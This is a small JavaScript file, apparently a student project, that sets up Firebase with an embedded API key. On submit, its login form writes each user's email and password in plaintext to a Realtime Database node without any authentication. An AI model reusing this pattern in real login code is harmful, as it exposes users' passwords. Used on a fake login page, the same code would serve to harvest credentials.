const firebaseConfig = {
    apiKey: "AIzaSyAgNIBfixCjymwTXDVwW5g1TsV0NFJYupo",
    authDomain: "app-gnanlin-renisha.firebaseapp.com",
    databaseURL: "https://app-gnanlin-renisha-default-rtdb.firebaseio.com",
    projectId: "app-gnanlin-renisha",
    storageBucket: "app-gnanlin-renisha.appspot.com",
    messagingSenderId: "1011637804332",
    appId: "1:1011637804332:web:801c0b09384f2dad276089"
};


//   initialize database
const app=initializeApp(firebaseConfig);


// reference my database
const applicationDB = firebase.database().ref("login")
document.getElementById(("login")).addEventListener("submit", submitform)



function submitform(event) {
    event.preventDefault();


    var email = getelement("email")

    var password = getelement("password")
    savedmessages(email,password)
    console.log("hi")
}
const savedmessages=(email,password)=>{
    var newapp=applicationDB.push();
    newapp.set({
        email:email,
        password:password,
    })
}
const getelement = (id) => {
    return document.getElementById(id).value

}